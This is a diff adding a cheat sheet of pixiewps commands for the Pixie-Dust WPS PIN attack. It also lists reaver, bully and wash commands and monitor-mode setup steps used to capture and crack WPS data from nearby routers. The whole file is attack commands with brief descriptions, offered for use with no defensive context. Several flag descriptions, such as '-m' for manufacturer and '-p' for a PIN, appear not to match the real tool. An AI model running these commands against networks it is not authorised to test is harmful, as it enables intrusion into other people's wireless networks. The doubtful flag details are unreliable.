@@ -1,0 +1,73 @@
+[X] Pixiewps Command List
+
+[\] pixiewps
+[/] Launch Pixiewps with default settings
+
+[\] pixiewps -h
+[/] Show help menu
+
+[\] pixiewps -e <PKE> -r <PKR> -s <E-Hash1> -z <E-Hash2> -a <AuthKey>
+[/] Run Pixie‑Dust attack with full parameters
+
+[\] pixiewps -e <PKE> -s <E-Hash1> -z <E-Hash2>
+[/] Run attack using only public key & hashes
+
+[\] pixiewps -e <PKE> -r <PKR>
+[/] Use PKE and PKR values only
+
+[\] pixiewps -a <AuthKey>
+[/] Use authentication key only
+
+[\] pixiewps -v
+[/] Enable verbose output
+
+[\] pixiewps -vv
+[/] Extra verbose output
+
+[\] pixiewps -f
+[/] Force attack even with incomplete data
+
+[\] pixiewps -k <E-SNonce>
+[/] Provide E‑SNonce manually
+
+[\] pixiewps -n <R-SNonce>
+[/] Provide R‑SNonce manually
+
+[\] pixiewps -m <Manufacturer>
+[/] Specify AP manufacturer (optimizes attack)
+
+[\] pixiewps -p <PIN>
+[/] Test a specific WPS PIN
+
+[\] pixiewps -o output.txt
+[/] Save output to file
+
+[\] pixiewps -q
+[/] Quiet mode (minimal output)
+
+[\] pixiewps --version
+[/] Show Pixiewps version
+
+[\] pixiewps --help
+[/] Display extended help
+
+[\] reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1
+[/] Use Reaver to gather Pixie‑Dust data (common workflow)
+
+[\] bully -b AA:BB:CC:DD:EE:FF -K
+[/] Use Bully to gather Pixie‑Dust data (common workflow)
+
+[\] wash -i wlan0mon
+[/] Scan for WPS‑enabled networks (companion tool)
+
+[\] sudo ip link set wlan0 down
+[/] Bring interface down
+
+[\] sudo iwconfig wlan0 mode monitor
+[/] Enable monitor mode manually
+
+[\] sudo ip link set wlan0 up
+[/] Bring interface up
+
+[\] sudo airmon-ng check kill
+[/] Kill processes interfering with monitor mode
